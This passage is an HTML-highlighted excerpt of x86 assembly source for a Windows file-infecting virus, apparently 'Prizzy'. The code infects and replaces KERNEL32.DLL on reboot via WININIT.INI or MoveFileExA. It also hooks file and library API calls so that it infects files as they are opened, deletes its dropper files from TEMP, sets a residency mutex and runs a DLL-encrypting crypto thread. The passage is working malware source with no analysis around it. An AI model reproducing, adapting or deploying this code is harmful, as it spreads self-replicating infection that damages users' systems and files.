        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__ik_window</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;new filepath</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__ik_system</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;actual filename</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddCopyFileA</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;if error, we're probably</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__ik_fault</span><span class="sc0">      </span><span class="sc1">;in memory :)</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__ik_window</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">filename_ptr</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">it_is_kernel</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0">  </span><span class="sc1">;infect kernel flag</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">infect_file</span><span class="sc0">

        </span><span class="sc1">; check system version Win9X or WinNT/2k ?</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddGetVersion</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">bt</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">3Fh</span><span class="sc0">         </span><span class="sc1">;get last bit</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">__ik_nt2k</span><span class="sc0">       </span><span class="sc1">;jump if WinNT/2k</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__ik_window</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddlstrlen</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">filename_size</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__ik_window</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddGetWindowsDirectoryA</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__ik_wininit</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;wininit file name</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__ik_window</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddlstrcat</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;window_dir + wininit</span><span class="sc0">

        </span><span class="sc1">; create WININIT.INI file and update one !</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__ik_window</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__ik_system</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;existing KERNEL32.DLL</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__ik_nul</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__ik_rename</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddWritePrivatePFStringA</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc1">; build the rename INI instruction</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__ik_window</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;wininit path</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__ik_window</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;infected/old k32</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__ik_system</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;new k32 path</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__ik_rename</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;rename section</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddWritePrivatePFStringA</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__ik_fault</span><span class="sc0">
    </span><span class="sc5">__ik_nt2k</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000005h</span><span class="sc0">       </span><span class="sc1">;after reboot, replace</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__ik_system</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;new k32 path</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__ik_window</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;old k32 path</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddMoveFileExA</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc5">__ik_fault</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__ik_window</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">mdealloc</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__ik_system</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">mdealloc</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">it_is_kernel</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ hooked functions ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc5">myCreateFileW</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0E8h</span><span class="sc4">,</span><span class="sc5">hookInfectFile</span><span class="sc4">-</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">3</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">68h</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc2">0C3h</span><span class="sc0">
</span><span class="sc5">myCreateFileA</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0E8h</span><span class="sc4">,</span><span class="sc5">hookInfectFile</span><span class="sc4">-</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">68h</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc2">0C3h</span><span class="sc0">
</span><span class="sc5">myOpenFile</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0E8h</span><span class="sc4">,</span><span class="sc5">hookInfectFile</span><span class="sc4">-</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">68h</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc2">0C3h</span><span class="sc0">
</span><span class="sc5">my_lopen</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0E8h</span><span class="sc4">,</span><span class="sc5">hookInfectFile</span><span class="sc4">-</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">68h</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc2">0C3h</span><span class="sc0">

</span><span class="sc5">myCopyFileW</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0E8h</span><span class="sc4">,</span><span class="sc5">hookInfectFile</span><span class="sc4">-</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">3</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">68h</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc2">0C3h</span><span class="sc0">
</span><span class="sc5">myCopyFileA</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0E8h</span><span class="sc4">,</span><span class="sc5">hookInfectFile</span><span class="sc4">-</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">68h</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc2">0C3h</span><span class="sc0">
</span><span class="sc5">myMoveFileW</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0E8h</span><span class="sc4">,</span><span class="sc5">hookInfectFile</span><span class="sc4">-</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">3</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">68h</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc2">0C3h</span><span class="sc0">
</span><span class="sc5">myMoveFileA</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0E8h</span><span class="sc4">,</span><span class="sc5">hookInfectFile</span><span class="sc4">-</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">68h</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc2">0C3h</span><span class="sc0">
</span><span class="sc5">myMoveFileExW</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0E8h</span><span class="sc4">,</span><span class="sc5">hookInfectFile</span><span class="sc4">-</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">3</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">68h</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc2">0C3h</span><span class="sc0">
</span><span class="sc5">myMoveFileExA</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0E8h</span><span class="sc4">,</span><span class="sc5">hookInfectFile</span><span class="sc4">-</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">68h</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc2">0C3h</span><span class="sc0">

</span><span class="sc5">myLoadLibraryW</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0E8h</span><span class="sc4">,</span><span class="sc5">hookInfectFile</span><span class="sc4">-</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">3</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">68h</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc2">0C3h</span><span class="sc0">
</span><span class="sc5">myLoadLibraryA</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0E8h</span><span class="sc4">,</span><span class="sc5">hookInfectFile</span><span class="sc4">-</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">68h</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc2">0C3h</span><span class="sc0">
</span><span class="sc5">myLoadLibraryExW</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0E8h</span><span class="sc4">,</span><span class="sc5">hookInfectFile</span><span class="sc4">-</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">3</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">68h</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc2">0C3h</span><span class="sc0">
</span><span class="sc5">myLoadLibraryExA</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0E8h</span><span class="sc4">,</span><span class="sc5">hookInfectFile</span><span class="sc4">-</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">68h</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc2">0C3h</span><span class="sc0">
</span><span class="sc5">myFreeLibrary</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0E8h</span><span class="sc4">,</span><span class="sc5">hookInfectFile</span><span class="sc4">-</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">68h</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc2">0C3h</span><span class="sc0">

</span><span class="sc5">EndOfNewFunctions</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ common hooked functions ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

        </span><span class="sc1">;---------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;This function is runned from kernel32 file, first time do</span><span class="sc0">
        </span><span class="sc1">;    * clear some valuez, bufferz</span><span class="sc0">
        </span><span class="sc1">;    * delete files in \TEMP\ (droppers)</span><span class="sc0">
        </span><span class="sc1">;    * create "already resident" flag (mutex)</span><span class="sc0">
        </span><span class="sc1">;    * inicialize "Hyper Infection" (SetTimer)</span><span class="sc0">
        </span><span class="sc1">;    * create a crypto thread</span><span class="sc0">
        </span><span class="sc1">;    * get actual process ID</span><span class="sc0">
        </span><span class="sc1">;Then if I'll catch "FreeLibrary" function, I'll do:</span><span class="sc0">
        </span><span class="sc1">;    * call "crypto_get_library" (more info there)</span><span class="sc0">
        </span><span class="sc1">;And If I'll catch "LoadLibrary, CreateFile, ..." function</span><span class="sc0">
        </span><span class="sc1">;    * is it a DLL file</span><span class="sc0">
        </span><span class="sc1">;    * call "crypto_thread" by CT_DECRYPTFILE flag</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;We might say this function is the most important in virus</span><span class="sc0">
        </span><span class="sc1">;many problems were here.</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">hookInfectFile</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc1">; prepare for UniCode functions</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0F9h</span><span class="sc0">         </span><span class="sc1">;hidden STC instruction</span><span class="sc0">

    </span><span class="sc9">IFDEF</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc0">             </span><span class="sc1">;my SoftICE breakpoint</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">           </span><span class="sc1">;many battles were here</span><span class="sc0">
    </span><span class="sc9">ENDIF</span><span class="sc0">

        </span><span class="sc6">pusha</span><span class="sc0">               </span><span class="sc1">;save all registers</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">               </span><span class="sc1">;save all flags</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_base_ebp</span><span class="sc0">        </span><span class="sc1">;get delta offset</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">__hif_no_stop</span><span class="sc0">       </span><span class="sc1">;ansi version</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">unicode2ansi</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__hif_finish</span><span class="sc0">        </span><span class="sc1">;no bytes converted ?</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__hif_continue</span><span class="sc0">

        </span><span class="sc1">; test whether "Prizzy Hyper Infection" has been actived...</span><span class="sc0">
    </span><span class="sc5">__hif_no_stop</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">HyperInfection_k32</span><span class="sc4">],</span><span class="sc2">00000000h</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__hif_continue</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">clear_valuez</span><span class="sc0">        </span><span class="sc1">;clear archive structures</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">clear_temp_droppers</span><span class="sc0"> </span><span class="sc1">;delete temp file trom \TEMP\
        call    create_mutex        ;already resident</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">hookHyperInfection</span><span class="sc0">  </span><span class="sc1">;inicialize "HyperInfection"</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">crypt_thread</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;create common crypt thread</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">         </span><span class="sc1">;...and its parameter</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__MyCreateThread</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">crypto_mainThread</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddGetCurrentProcessId</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;get process ID number</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">crypto_mainProcId</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">crypto_thread</span><span class="sc4">],</span><span class="sc5">CT_LOADKEY</span><span class="sc0">  </span><span class="sc1">;load cryptography</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">crypto_thread_err</span><span class="sc4">],</span><span class="sc12">'!A92'</span><span class="sc0">  </span><span class="sc1">;key and wait then</span><span class="sc0">
    </span><span class="sc5">__hif_crLoadKey</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">50</span><span class="sc0">          </span><span class="sc1">;active thread to load crypto</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">crypto_mainThread</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;key</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddWaitForSingleObject</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">crypto_thread_err</span><span class="sc4">],</span><span class="sc12">'!A92'</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__hif_crLoadKey</span><span class="sc0">

        </span><span class="sc1">; which type of function is called ?</span><span class="sc0">
    </span><span class="sc5">__hif_continue</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">myCreateFileW</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;start of table</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">00000024h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;return address</span><span class="sc0">
        </span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000005h</span><span class="sc0">       </span><span class="sc1">; - call instruction</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">myCreateFileA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">myCreateFileW</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">cdq</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">         </span><span class="sc1">;get number of function</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">000Eh</span><span class="sc0">        </span><span class="sc1">;FreeLibrary ?</span><span class="sc0">
